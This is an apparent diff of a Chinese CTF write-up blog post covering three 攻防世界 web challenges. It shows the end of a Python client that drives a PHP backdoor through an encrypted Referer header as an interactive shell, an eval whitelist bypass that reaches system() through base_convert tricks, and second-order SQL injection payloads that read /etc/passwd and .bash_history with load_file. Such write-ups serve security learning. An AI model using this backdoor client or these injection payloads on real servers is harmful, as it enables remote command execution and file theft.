+debugPrint(<span class="hljs-string">'md5 head: %s'</span> % (md5head,))
+debugPrint(<span class="hljs-string">'md5 tail: %s'</span> % (md5tail,))
+
+<span class="hljs-comment"># 交互式 Shell</span>
+cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span>
+<span class="hljs-keyword">while</span> cmd != <span class="hljs-string">''</span>:
+    <span class="hljs-comment"># 在写入 Payload 前填充一些无关数据</span>
+    query = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(max(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):
+        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))
+        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))
+        query.append((key, value))    <span class="hljs-comment"># 生成无关数据并填充</span>
+    debugPrint(<span class="hljs-string">'Before insert payload:'</span>)
+    debugPrint(query)
+    debugPrint(urllib.urlencode(query))
+
+    <span class="hljs-comment"># 对 Payload 进行加密</span>
+    payload = zlib.compress(cmd)    <span class="hljs-comment"># gzcompress 操作</span>
+    payload = loopXor(payload,xorKey)    <span class="hljs-comment"># 循环异或运算 , PHP代码中的 x() 函数</span>
+    payload = base64.urlsafe_b64encode(payload)    <span class="hljs-comment"># base64_encode 编码</span>
+    payload = md5head + payload    <span class="hljs-comment">#    在开头补全$h</span>
+
+    <span class="hljs-comment">#  对Payload进行修改</span>
+    cutIndex = randint(<span class="hljs-number">2</span>,len(payload)<span class="hljs-number">-3</span>)
+    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)
+    iPiece = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:
+        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])
+        iPiece += <span class="hljs-number">1</span>
+    <span class="hljs-comment"># 将 Payload 作为查询字符串编码拼接到 Referer 中</span>
+    referer = url + <span class="hljs-string">'?'</span> + urllib.urlencode(query)
+    debugPrint(<span class="hljs-string">'After insert payload, referer is:'</span>)
+    debugPrint(query)
+    debugPrint(referer)
+
+    <span class="hljs-comment"># 发送 HTTP GET 请求</span>
+    r = sess.get(url,headers=&#123;<span class="hljs-string">'Accept-Language'</span>:acceptLangStr,<span class="hljs-string">'Referer'</span>:referer&#125;,proxies=proxies)
+    html = r.text
+    debugPrint(html)
+
+    <span class="hljs-comment"># 接收响应数据包</span>
+    pattern = re.compile(<span class="hljs-string">r'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))
+    output = pattern.findall(html)
+    <span class="hljs-comment"># 如果没有收到响应数据包</span>
+    <span class="hljs-keyword">if</span> len(output) == <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'Error,  no backdoor response'</span>)
+        cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span>
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-comment"># 如果收到响应数据包 , 则对其进行处理</span>
+    output = output[<span class="hljs-number">0</span>]
+    debugPrint(output)
+    output = output.decode(<span class="hljs-string">'base64'</span>)    <span class="hljs-comment"># base64_decode 解码</span>
+    output = loopXor(output,xorKey)    <span class="hljs-comment"># 循环异或运算</span>
+    output = zlib.decompress(output)   <span class="hljs-comment"># gzuncompress 运算</span>
+    print(output)    <span class="hljs-comment"># 输出响应信息</span>
+    cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span></code></pre></div>
+
+
+
+<p>难度属实有点大了，超出能力范围。</p>
+<p>参考</p>
+<blockquote>
+<p><a href="https://www.guildhab.top/?p=1474" target="_blank" rel="noopener">Web_php_wrong_nginx_config WriteUp – H0t-A1r-B4llo0n (guildhab.top)</a></p>
+<p><a href="https://blog.csdn.net/weixin_44604541/article/details/107801811" target="_blank" rel="noopener">(2条消息) 攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config_闵行小鱼塘-CSDN博客</a></p>
+</blockquote>
+<h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><p>这出题人大意了啊。。。直接可以给显示出来了</p>
+<p><img src="https://i.loli.net/2020/12/05/bPZfgzaGHwDoinr.png" srcset="/img/loading.gif" alt="image-20201205201112120"></p>
+<p>还是正常做一做，这题好像有问题，就在buuctf上做了</p>
+<h3 id="0x1代码审计-1"><a href="#0x1代码审计-1" class="headerlink" title="0x1代码审计"></a>0x1代码审计</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>]))&#123;
+    show_source(<span class="hljs-keyword">__FILE__</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-comment">//例子 c=20-1</span>
+    $content = $_GET[<span class="hljs-string">'c'</span>];
+    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"太长了不会算"</span>);
+    &#125;
+    $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];
+    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $content)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的字符"</span>);
+        &#125;
+    &#125;
+    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
+    $whitelist = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];
+    preg_match_all(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  
+    <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;
+        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">"请不要输入奇奇怪怪的函数"</span>);
+        &#125;
+    &#125;
+    <span class="hljs-comment">//帮你算出答案</span>
+    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$content.<span class="hljs-string">';'</span>);
+&#125;</code></pre></div>
+
+
+
+<p>get提交参数c，c的长度不能超过80</p>
+<p>不能包括blacklist中的字符</p>
+<p>不能有不是$whitelist白名单里面的单词出现</p>
+<p>并且函数只能以下面的格式出现</p>
+<blockquote>
+<p>abs(1)能过<br>1abs()能过<br>absa()不能过<br>abs(a)不能过<br>abs()a不能过</p>
+</blockquote>
+<p>代码的最后出现了 eval 这是我们想看到的，因为它出现的时候，就可能存在命令执行漏洞</p>
+<p>这题实在是无能为力，看了王师傅的wp</p>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html" target="_blank" rel="noopener">详情看这里</a></p>
+<h3 id="0x2构造payload-1"><a href="#0x2构造payload-1" class="headerlink" title="0x2构造payload"></a>0x2构造payload</h3><p>//这题需要使用到php复杂变量，具体可以看<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">这里</a></p>
+<p>当这个题目没有给出那么限制的时候我们想要构造的payload一定是</p>
+<div class="hljs"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">"cat /flag"</span>)</code></pre></div>
+
+<p>但是由于限制，必须想办法绕过这些限制，比如多提交一个参数，构造出上面的payload</p>
+<p>比如</p>
+<div class="hljs"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[b])(<span class="hljs-symbol">$</span>_GET[a])&amp;b=<span class="hljs-keyword">system</span>&amp;a=cat /flag <span class="hljs-comment">//这里是b,a多提交的参数，不会被检测 这里的[]可以使用&#123;&#125;代替</span></code></pre></div>
+
+<p>下面的具体工作就是如何利用上面提供的函数构造出 <code>_GET</code>，并且能够绕过检测。</p>
+<p>首先看一下函数的白名单里给了哪些可以用的函数<strong>base_convert()，dechex</strong></p>
+<p>还有一些短的函数名pi,cos,sin,tan等，因为限制了长度，所以要尽量使用短的函数名代替a和b</p>
+<p><img src="https://i.loli.net/2020/12/05/GnP1emRYpJDd2Q6.png" srcset="/img/loading.gif" alt="base_convert"></p>
+<p><img src="https://i.loli.net/2020/12/05/TsrCzK3hAl4ufEm.png" srcset="/img/loading.gif" alt="dechex"></p>
+<p>开始的想法就是将利用base_canvert()，转化出一个_GET，但是发现base_convert()不支持_，并且转换出的字符是小写的</p>
+<p><img src="https://i.loli.net/2020/12/05/9G4zKrO2HMoc1vN.png" srcset="/img/loading.gif" alt="image-20201205215546962"></p>
+<p>所以这里用到了一个中间过渡的函数hex2bin()，与之功能想反的函数是bin2hex()</p>
+<p><img src="https://i.loli.net/2020/12/05/JeivVF1qO8YyRmK.png" srcset="/img/loading.gif" alt="image-20201205220057762"></p>
+<p>实现方法如下</p>
+<p><img src="https://i.loli.net/2020/12/05/FVMbzCNOwkIsnWd.png" srcset="/img/loading.gif" alt="image-20201205215938937"></p>
+<p>下面就是将_GET转换为十六进制数字</p>
+<div class="hljs"><pre><code class="hljs gams"><span class="hljs-comment">//bin2hex("_GET")-&gt;5f474554</span>
+?c=<span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-number">5</span>f474554);(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag</code></pre></div>
+
+<p>想法是好的，但是这里不能直接提交，因为不符合上面的几种函数使用的格式</p>
+<p>所以就要想办法使用一个函数把<code>5f474554</code>提交上去</p>
+<p>这里用的是dechex，就是将十进制数转换为十六进制数，再交给hex2bin出来</p>
+<p>所以这里有个逆过程就是将<code>5f474554</code>转换为十进制</p>
+<div class="hljs"><pre><code class="hljs 1c">intval('5f<span class="hljs-number">474554</span>',<span class="hljs-number">16</span>);</code></pre></div>
+
+<p>所以具体的payload如下</p>
+<div class="hljs"><pre><code class="hljs gams">?c=<span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">1</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built-in">pi</span>)&#123;<span class="hljs-number">2</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>&amp;<span class="hljs-number">2</span>=tac /flag
+
+<span class="hljs-comment">//base_convert(37907361743,10,36)=&gt;hex2bin</span>
+<span class="hljs-comment">//dechex(1598506324)=&gt;5f474554</span>
+<span class="hljs-comment">//hex2bin('5f474554')=&gt;_GET</span>
+<span class="hljs-comment">//$pi=_GET</span>
+<span class="hljs-comment">//($_GET)&#123;1&#125;($_GET&#123;2&#125;)</span></code></pre></div>
+
+<p>7分的题目果然不一样，看wp都写了好久</p>
+<p>既然没有能力自己做出来，那就好好研究一下别人做题的思路，以便以后遇到类似题目能够有思路。</p>
+<h2 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h2><h3 id="0x1扫描目录"><a href="#0x1扫描目录" class="headerlink" title="0x1扫描目录"></a>0x1扫描目录</h3><p>拿到题目扫 一下目录，发现是出现.git，那应该就是git源码泄露，可是githacker下载下来的文件好像不全，看了看大佬的wp</p>
+<p>暂时没搞懂是怎么下载的，日后再看细看</p>
+<p>源码如下</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span> <span class="hljs-string">"mysql.php"</span>;
+session_start();
+<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">'login'</span>] != <span class="hljs-string">'yes'</span>)&#123;
+    header(<span class="hljs-string">"Location: ./login.php"</span>);
+    <span class="hljs-keyword">die</span>();
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'do'</span>]))&#123;
+<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">'do'</span>])
+&#123;
+<span class="hljs-keyword">case</span> <span class="hljs-string">'write'</span>:
+    $category = addslashes($_POST[<span class="hljs-string">'category'</span>]);
+    $title = addslashes($_POST[<span class="hljs-string">'title'</span>]);
+    $content = addslashes($_POST[<span class="hljs-string">'content'</span>]);
+    $sql = <span class="hljs-string">"insert into board</span>
+<span class="hljs-string">            set category = '$category',</span>
+<span class="hljs-string">                title = '$title',</span>
+<span class="hljs-string">                content = '$content'"</span>;
+    $result = mysql_query($sql);
+    header(<span class="hljs-string">"Location: ./index.php"</span>);
+    <span class="hljs-keyword">break</span>;
+<span class="hljs-keyword">case</span> <span class="hljs-string">'comment'</span>:
+    $bo_id = addslashes($_POST[<span class="hljs-string">'bo_id'</span>]);
+    $sql = <span class="hljs-string">"select category from board where id='$bo_id'"</span>;
+    $result = mysql_query($sql);
+    $num = mysql_num_rows($result);
+    <span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;
+    $category = mysql_fetch_array($result)[<span class="hljs-string">'category'</span>];
+    $content = addslashes($_POST[<span class="hljs-string">'content'</span>]);
+    $sql = <span class="hljs-string">"insert into comment</span>
+<span class="hljs-string">            set category = '$category',</span>
+<span class="hljs-string">                content = '$content',</span>
+<span class="hljs-string">                bo_id = '$bo_id'"</span>;
+    $result = mysql_query($sql);
+    &#125;
+    header(<span class="hljs-string">"Location: ./comment.php?id=$bo_id"</span>);
+    <span class="hljs-keyword">break</span>;
+<span class="hljs-keyword">default</span>:
+    header(<span class="hljs-string">"Location: ./index.php"</span>);
+&#125;
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    header(<span class="hljs-string">"Location: ./index.php"</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>可以看到在write部分提交的都是经过转义后带入查询语句查询的，但是下面的comment中category没有经过任何过滤就带入了sql语句进行查询，这就可能存在二次注入。</p>
+<h3 id="0x2二次注入"><a href="#0x2二次注入" class="headerlink" title="0x2二次注入"></a>0x2二次注入</h3><p>进入题目可以提交评论，但是要登录，给了提示</p>
+<div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>zhangwei
+<span class="hljs-symbol">password:</span>zhangwei***</code></pre></div>
+
+<p>使用bp爆破出的密码是zhangwei666</p>
+<p><img src="https://i.loli.net/2020/12/07/8Xx35WQfTARLcnz.png" srcset="/img/loading.gif" alt="image-20201207093624672"></p>
+<p>登录后先进入发帖的界面,构造payload</p>
+<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
+            set category &#x3D; &#39;$category&#39;,
+                content &#x3D; &#39;$content&#39;,
+                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div>
+
+<p>之前sql注入方法中经常使用的注释方法都是当行注释，但是这个题目的查询使用的是多行，所以这里注释也需要使用多行注释  /**/ </p>
+<p>在这里注入的sql语句，在comment页面会被sql重新调出来，从而执行了注入语句，这也是为啥叫做二次注入</p>
+<p>于是构造的sql语句如下</p>
+<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
+            set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;,
+                content &#x3D; &#39;*&#x2F;#&#39;,
+                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div>
+
+<p>因为中间的 cntent被包围在多行注释中间，所以这里不起作用等价于</p>
+<div class="hljs"><pre><code class="hljs mysql">$sql &#x3D; &quot;insert into comment
+            set category &#x3D; &#39;&#39;,content&#x3D;user(),
+                bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre></div>
+
+<p>当在评论页面评论<code>*/#</code>时，会与之前的<code>/*</code>的进行闭合，就够造出了我们想要的sql语句，user()这个sql函数就会被执行，显示当前的用户</p>
+<p><img src="https://i.loli.net/2020/12/07/DEre87viLhH6Aby.png" srcset="/img/loading.gif" alt="image-20201207094017109"></p>
+<p> 原理知道了，下面就是具体的做这个题目</p>
+<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong></p>
+<p><img src="https://i.loli.net/2020/12/07/rg5k8mAsKST3hea.png" srcset="/img/loading.gif" alt="image-20201207094741282"></p>
+<p>可以看到是有www用户的，那么久存在<strong>.bash_history</strong> 记录，继续查看</p>
+<div class="hljs"><pre><code class="hljs reasonml">title=<span class="hljs-number">1</span>&amp;category=',content=(select( load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span>.<span class="hljs-params">bash_history</span>')</span>)),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div>
+
+
+
+
+
+<p><img src="https://i.loli.net/2020/12/07/7YDFXWbGHcxNqAk.png" srcset="/img/loading.gif" alt="image-20201207094934593"></p>
+<p>也就是以下几条指令</p>
+<div class="hljs"><pre><code class="hljs routeros">cd  /tmp/ 
+unzip html.zip
+rm -f html.zip
+cp -r html /var/www/
+cd  /var/www/html/
+rm -f .DS_Store
+service apache2 start</code></pre></div>
+
+<p>可以看出来 <code>.Ds_Store</code>是存在/tmp/html目录下的，那就看看有什么</p>
+<p>直接查看该文件会发现长度不够，而且显示不可见字符</p>
+<p><img src="https://i.loli.net/2020/12/07/Bl5n6KNOTUdGb1Z.png" srcset="/img/loading.gif" alt="image-20201207095822022"></p>
+<p>使用hex()就可以解决这个问题</p>
+<div class="hljs"><pre><code class="hljs sql">title=1&amp;category=',content=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">hex</span>( <span class="hljs-keyword">load_file</span>(<span class="hljs-string">'/tmp/html/.DS_Store'</span>))),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div>
+
+<p>在线解码后可以看到以下内容，存在一个 <code>flag_8946e1ff1ee3e40f.php</code></p>
+<p><img src="/2020/11/30/adworld/C:%5CUsers%5CSunzh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201207100157447.png" srcset="/img/loading.gif" alt="image-20201207100157447"></p>
+<p>查看flag，但是要注意的是，这个文件是从 /var/www/html/中复制过来的，所以还是要到那个目录读取</p>
+<div class="hljs"><pre><code class="hljs reasonml">title=<span class="hljs-number">1</span>&amp;category=',content=(select hex( load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">flag_8946e1ff1ee3e40f</span>.<span class="hljs-params">php</span>')</span>)),<span class="hljs-comment">/*&amp;content=11</span></code></pre></div>
+
+
+
+<p><img src="https://i.loli.net/2020/12/07/Ce9WJYTFU5HMrOp.png" srcset="/img/loading.gif" alt="image-20201207101235024"></p>
+<p>在线解码即可</p>
 
             </div>
             <hr>
@@ -937,13 +1520,6 @@ more `<span class="hljs-builtin-name">find</span> / -inum `</code></pre></div>
                     
                   </div>
                 
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
-                    
-                  </div>
                 
               </div>
               
